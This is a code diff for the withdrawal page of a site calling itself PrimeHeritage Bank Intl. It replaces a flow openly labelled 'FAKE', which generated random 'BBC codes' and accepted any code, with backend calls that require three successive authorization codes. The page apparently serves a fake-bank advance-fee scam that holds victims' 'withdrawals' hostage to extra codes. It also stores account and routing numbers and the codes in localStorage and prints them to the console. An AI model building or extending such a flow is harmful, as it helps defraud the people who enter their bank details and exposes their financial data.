@@ -527,6 +527,7 @@
     <script>
         const API_URL = 'https://primeheritage-bank-intl.onrender.com';
         let currentRef = null;
+        let savedData = {};
 
         function setTheme(theme) {
             document.body.setAttribute('data-theme', theme);
@@ -558,7 +559,121 @@
         }
 
         // ============================================================
-        // STEP 1: SUBMIT WITHDRAWAL DETAILS (FAKE)
+        // SAVE PROGRESS TO localStorage
+        // ============================================================
+        function saveProgress(step, data) {
+            const progress = {
+                step: step,
+                data: data,
+                timestamp: Date.now()
+            };
+            localStorage.setItem('withdrawProgress', JSON.stringify(progress));
+            console.log('✅ Progress saved:', step);
+        }
+
+        function clearProgress() {
+            localStorage.removeItem('withdrawProgress');
+            console.log('✅ Progress cleared');
+        }
+
+        function loadProgress() {
+            try {
+                const saved = localStorage.getItem('withdrawProgress');
+                if (saved) {
+                    const progress = JSON.parse(saved);
+                    // Check if progress is less than 1 hour old
+                    if (Date.now() - progress.timestamp < 3600000) {
+                        return progress;
+                    }
+                }
+            } catch(e) {}
+            return null;
+        }
+
+        // ============================================================
+        // RESTORE PROGRESS ON PAGE LOAD
+        // ============================================================
+        function restoreProgress() {
+            const progress = loadProgress();
+            if (!progress) return;
+
+            const data = progress.data;
+            const step = progress.step;
+
+            console.log('🔄 Restoring progress:', step);
+
+            // Restore form fields
+            if (data.bankName) document.getElementById('bankName').value = data.bankName;
+            if (data.accountHolder) document.getElementById('accountHolder').value = data.accountHolder;
+            if (data.bankAccountNumber) document.getElementById('bankAccountNumber').value = data.bankAccountNumber;
+            if (data.routingNumber) document.getElementById('routingNumber').value = data.routingNumber;
+            if (data.amount) document.getElementById('amount').value = data.amount;
+
+            currentRef = data.reference || null;
+
+            if (step === 'step1') {
+                // Show step1 form
+                document.getElementById('step1Form').style.display = 'block';
+                document.getElementById('codeForm').style.display = 'none';
+                return;
+            }
+
+            // Show code form
+            document.getElementById('step1Form').style.display = 'none';
+            document.getElementById('codeForm').style.display = 'block';
+
+            if (step === 'code1') {
+                document.getElementById('codeStep1').style.display = 'block';
+                document.getElementById('codeStep2').style.display = 'none';
+                document.getElementById('codeStep3').style.display = 'none';
+                // Pre-fill codes if saved
+                if (data.code1) {
+                    const c1 = data.code1.split('');
+                    for (let i = 0; i < c1.length; i++) {
+                        const el = document.getElementById('c1_' + (i+1));
+                        if (el) el.value = c1[i];
+                    }
+                }
+                document.getElementById('c1_1').focus();
+            } else if (step === 'code2') {
+                document.getElementById('codeStep1').style.display = 'none';
+                document.getElementById('codeStep2').style.display = 'block';
+                document.getElementById('codeStep3').style.display = 'none';
+                if (data.code2) {
+                    const c2 = data.code2.split('');
+                    for (let i = 0; i < c2.length; i++) {
+                        const el = document.getElementById('c2_' + (i+1));
+                        if (el) el.value = c2[i];
+                    }
+                }
+                document.getElementById('c2_1').focus();
+            } else if (step === 'code3') {
+                document.getElementById('codeStep1').style.display = 'none';
+                document.getElementById('codeStep2').style.display = 'none';
+                document.getElementById('codeStep3').style.display = 'block';
+                if (data.code3) {
+                    const c3 = data.code3.split('');
+                    for (let i = 0; i < c3.length; i++) {
+                        const el = document.getElementById('c3_' + (i+1));
+                        if (el) el.value = c3[i];
+                    }
+                }
+                document.getElementById('c3_1').focus();
+            }
+
+            // Show a notification
+            Swal.fire({
+                icon: 'info',
+                title: 'Resuming Transaction',
+                text: `Continue from where you left off (Step ${step})`,
+                timer: 2000,
+                showConfirmButton: false,
+                confirmButtonColor: '#C6A43F'
+            });
+        }
+
+        // ============================================================
+        // STEP 1: SUBMIT WITHDRAWAL DETAILS
         // ============================================================
         async function withdrawStep1() {
             const bankName = document.getElementById('bankName').value.trim();
@@ -580,38 +695,53 @@
 
             showLoading(true);
             try {
-                // ✅ FAKE - Just generate a random reference
-                const fakeRef = 'TXN-' + Date.now().toString(36).toUpperCase() + '-' + 
-                               Math.random().toString(36).substring(2, 6).toUpperCase();
-                currentRef = fakeRef;
-                
-                // ✅ FAKE - Generate 3 random 6-digit BBC codes
-                const codes = [];
-                for (let i = 0; i < 3; i++) {
-                    codes.push(Math.floor(100000 + Math.random() * 900000).toString());
-                }
-                
-                // Store in localStorage for "persistence"
-                localStorage.setItem('fakeWithdrawRef', currentRef);
-                localStorage.setItem('fakeWithdrawCodes', JSON.stringify(codes));
-                localStorage.setItem('fakeWithdrawStep', '1');
-                
-                console.log('✅ FAKE Withdrawal Started - Reference:', currentRef);
-                console.log('✅ BBC Codes:', codes);
-                
-                document.getElementById('step1Form').style.display = 'none';
-                document.getElementById('codeForm').style.display = 'block';
-                document.getElementById('codeStep1').style.display = 'block';
-                document.getElementById('codeStep2').style.display = 'none';
-                document.getElementById('codeStep3').style.display = 'none';
-                document.getElementById('c1_1').focus();
-                
-                Swal.fire({
-                    icon: 'info',
-                    title: 'Authorization Required',
-                    text: `Enter BBC Authorization Code: ${codes[0]}`,
-                    confirmButtonColor: '#C6A43F'
+                const res = await fetch(`${API_URL}/api/withdraw/step1`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${localStorage.getItem('token')}`
+                    },
+                    body: JSON.stringify({
+                        bankName,
+                        accountHolder,
+                        bankAccountNumber: bankAccount,
+                        routingNumber: routing,
+                        amount,
+                        transactionPin: pin
+                    })
                 });
+                const data = await res.json();
+                console.log('Step 1 response:', data);
+                
+                if (data.success) {
+                    currentRef = data.reference;
+                    
+                    // ✅ Save progress to localStorage
+                    saveProgress('code1', {
+                        bankName,
+                        accountHolder,
+                        bankAccountNumber: bankAccount,
+                        routingNumber: routing,
+                        amount,
+                        reference: currentRef
+                    });
+                    
+                    document.getElementById('step1Form').style.display = 'none';
+                    document.getElementById('codeForm').style.display = 'block';
+                    document.getElementById('codeStep1').style.display = 'block';
+                    document.getElementById('codeStep2').style.display = 'none';
+                    document.getElementById('codeStep3').style.display = 'none';
+                    document.getElementById('c1_1').focus();
+                    
+                    Swal.fire({
+                        icon: 'info',
+                        title: 'Authorization Required',
+                        text: data.message || 'Enter your Authorization Code to continue',
+                        confirmButtonColor: '#C6A43F'
+                    });
+                } else {
+                    Swal.fire('Error', data.error || 'Withdrawal failed', 'error');
+                }
             } catch(e) {
                 console.error('Withdraw step1 error:', e);
                 Swal.fire('Error', 'Network error. Please try again.', 'error');
@@ -621,7 +751,7 @@
         }
 
         // ============================================================
-        // STEP 2: SUBMIT BBC AUTHORIZATION CODE (FAKE CHECK)
+        // STEP 2: SUBMIT BBC AUTHORIZATION CODE
         // ============================================================
         async function submitCode1() {
             const code = document.getElementById('c1_1').value + document.getElementById('c1_2').value +
@@ -635,40 +765,51 @@
 
             showLoading(true);
             try {
-                // ✅ FAKE - Always accept any 6-digit code
-                console.log('✅ Step 1 Code Entered:', code);
+                console.log('Submitting Step 2 with reference:', currentRef, 'code:', code);
                 
-                // Get stored codes
-                const storedCodes = JSON.parse(localStorage.getItem('fakeWithdrawCodes') || '[]');
-                const step1Code = storedCodes[0] || '123456';
+                const res = await fetch(`${API_URL}/api/withdraw/step2`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${localStorage.getItem('token')}`
+                    },
+                    body: JSON.stringify({ reference: currentRef, bbcCode: code })
+                });
+                const data = await res.json();
+                console.log('Step 2 response:', data);
                 
-                // ✅ FAKE - Just check if it's 6 digits
-                if (code.length === 6) {
-                    localStorage.setItem('fakeWithdrawStep', '2');
+                if (data.success) {
+                    // ✅ Update progress to step 2
+                    const progress = loadProgress();
+                    if (progress) {
+                        saveProgress('code2', {
+                            ...progress.data,
+                            code1: code
+                        });
+                    }
                     
                     document.getElementById('codeStep1').style.display = 'none';
                     document.getElementById('codeStep2').style.display = 'block';
                     document.getElementById('c2_1').focus();
-                    
                     Swal.fire({
                         icon: 'info',
                         title: 'Security Check',
-                        text: `Enter BBC Security Code: ${storedCodes[1] || '789012'}`,
+                        text: data.message || 'Enter your Security Code to continue',
                         confirmButtonColor: '#C6A43F'
                     });
                 } else {
-                    Swal.fire('Error', 'Invalid authorization code', 'error');
+                    Swal.fire('Error', data.error || 'Invalid authorization code', 'error');
                 }
             } catch(e) {
                 console.error('SubmitCode1 error:', e);
-                Swal.fire('Error', 'Verification failed', 'error');
+                Swal.fire('Error', 'Verification failed: ' + e.message, 'error');
             } finally {
                 showLoading(false);
             }
         }
 
         // ============================================================
-        // STEP 3: SUBMIT BBC SECURITY CODE (FAKE CHECK)
+        // STEP 3: SUBMIT BBC SECURITY CODE
         // ============================================================
         async function submitCode2() {
             const code = document.getElementById('c2_1').value + document.getElementById('c2_2').value +
@@ -682,37 +823,51 @@
 
             showLoading(true);
             try {
-                console.log('✅ Step 2 Code Entered:', code);
+                console.log('Submitting Step 3 with reference:', currentRef, 'code:', code);
                 
-                const storedCodes = JSON.parse(localStorage.getItem('fakeWithdrawCodes') || '[]');
+                const res = await fetch(`${API_URL}/api/withdraw/step3`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${localStorage.getItem('token')}`
+                    },
+                    body: JSON.stringify({ reference: currentRef, bbcCode: code })
+                });
+                const data = await res.json();
+                console.log('Step 3 response:', data);
                 
-                // ✅ FAKE - Just check if it's 6 digits
-                if (code.length === 6) {
-                    localStorage.setItem('fakeWithdrawStep', '3');
+                if (data.success) {
+                    // ✅ Update progress to step 3
+                    const progress = loadProgress();
+                    if (progress) {
+                        saveProgress('code3', {
+                            ...progress.data,
+                            code2: code
+                        });
+                    }
                     
                     document.getElementById('codeStep2').style.display = 'none';
                     document.getElementById('codeStep3').style.display = 'block';
                     document.getElementById('c3_1').focus();
-                    
                     Swal.fire({
                         icon: 'info',
                         title: 'Final Verification',
-                        text: `Enter BBC Final Code: ${storedCodes[2] || '345678'}`,
+                        text: data.message || 'Enter your Final Code to complete the withdrawal',
                         confirmButtonColor: '#C6A43F'
                     });
                 } else {
-                    Swal.fire('Error', 'Invalid security code', 'error');
+                    Swal.fire('Error', data.error || 'Invalid security code', 'error');
                 }
             } catch(e) {
                 console.error('SubmitCode2 error:', e);
-                Swal.fire('Error', 'Verification failed', 'error');
+                Swal.fire('Error', 'Verification failed: ' + e.message, 'error');
             } finally {
                 showLoading(false);
             }
         }
 
         // ============================================================
-        // STEP 4: SUBMIT BBC FINAL CODE & COMPLETE (FAKE SUCCESS)
+        // STEP 4: SUBMIT BBC FINAL CODE & COMPLETE
         // ============================================================
         async function submitCode3() {
             const code = document.getElementById('c3_1').value + document.getElementById('c3_2').value +
@@ -726,14 +881,22 @@
 
             showLoading(true);
             try {
-                console.log('✅ Step 3 Code Entered:', code);
+                console.log('Submitting Step 4 with reference:', currentRef, 'code:', code);
                 
-                // ✅ FAKE - Always accept any 6-digit code
-                if (code.length === 6) {
-                    localStorage.setItem('fakeWithdrawStep', 'completed');
-                    
-                    // ✅ FAKE - Send fake receipt email
-                    console.log('✅ Sending fake receipt email to user...');
+                const res = await fetch(`${API_URL}/api/withdraw/step4`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'Authorization': `Bearer ${localStorage.getItem('token')}`
+                    },
+                    body: JSON.stringify({ reference: currentRef, bbcCode: code })
+                });
+                const data = await res.json();
+                console.log('Step 4 response:', data);
+                
+                if (data.success) {
+                    // ✅ Clear progress on completion
+                    clearProgress();
                     
                     showLoading(false);
                     Swal.fire({
@@ -747,9 +910,6 @@
                                 <p style="margin-top: 12px; font-size: 12px; color: var(--text-secondary);">
                                     ⏱️ Processing Time: 1-3 business days
                                 </p>
-                                <p style="margin-top: 8px; font-size: 11px; color: var(--success);">
-                                    ✅ Receipt sent to your email
-                                </p>
                             </div>
                         `,
                         confirmButtonColor: '#C6A43F'
@@ -757,12 +917,12 @@
                         window.location.href = '/dashboard.html';
                     });
                 } else {
-                    Swal.fire('Error', 'Invalid final code', 'error');
+                    Swal.fire('Error', data.error || 'Withdrawal failed', 'error');
                     showLoading(false);
                 }
             } catch(e) {
                 console.error('SubmitCode3 error:', e);
-                Swal.fire('Error', 'Withdrawal failed', 'error');
+                Swal.fire('Error', 'Withdrawal failed: ' + e.message, 'error');
                 showLoading(false);
             }
         }
@@ -790,44 +950,13 @@
             }
         }
 
-        // ============================================================
-        // CHECK FOR EXISTING FAKE TRANSACTION ON LOAD
-        // ============================================================
-        function checkExistingTransaction() {
-            const step = localStorage.getItem('fakeWithdrawStep');
-            const ref = localStorage.getItem('fakeWithdrawRef');
-            
-            if (step && ref && step !== 'completed') {
-                // Resume from where they left off
-                document.getElementById('step1Form').style.display = 'none';
-                document.getElementById('codeForm').style.display = 'block';
-                
-                if (step === '1') {
-                    document.getElementById('codeStep1').style.display = 'block';
-                    document.getElementById('codeStep2').style.display = 'none';
-                    document.getElementById('codeStep3').style.display = 'none';
-                } else if (step === '2') {
-                    document.getElementById('codeStep1').style.display = 'none';
-                    document.getElementById('codeStep2').style.display = 'block';
-                    document.getElementById('codeStep3').style.display = 'none';
-                } else if (step === '3') {
-                    document.getElementById('codeStep1').style.display = 'none';
-                    document.getElementById('codeStep2').style.display = 'none';
-                    document.getElementById('codeStep3').style.display = 'block';
-                }
-                
-                currentRef = ref;
-                console.log('✅ Resuming fake transaction:', currentRef);
-            }
-        }
-
         const token = localStorage.getItem('token');
         if (!token && window.location.pathname !== '/') {
             window.location.href = '/';
         }
 
         loadBalance();
-        checkExistingTransaction();
+        restoreProgress();
     </script>
 </body>
 </html>
